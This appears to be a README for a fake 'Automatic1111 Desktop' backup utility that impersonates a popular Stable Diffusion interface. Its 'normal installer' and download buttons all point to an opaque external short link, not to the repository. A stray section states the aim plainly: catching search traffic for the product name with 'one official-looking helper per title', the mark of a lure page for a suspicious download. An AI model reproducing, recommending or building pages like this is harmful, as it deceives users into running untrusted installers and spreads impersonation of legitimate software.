![Automatic1111 Desktop](assets/hero.png)

# Automatic1111 Desktop

*Archive Automatic1111 files on this machine before you change the install.*

## About

**Automatic1111 Desktop** is a developer utility. Keep Automatic1111 workspace folders on disk: dated copies of model and prompt files before a patch.

Patches move Automatic1111 workspace paths without warning.

Meant for a local repo or a config file on disk. No hosted workspace.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Locates Automatic1111 user data on Windows and macOS.
- Archives workspace folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Automatic1111 is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/williamclark-38/automatic1111-desktop

MIT license. See `LICENSE`.
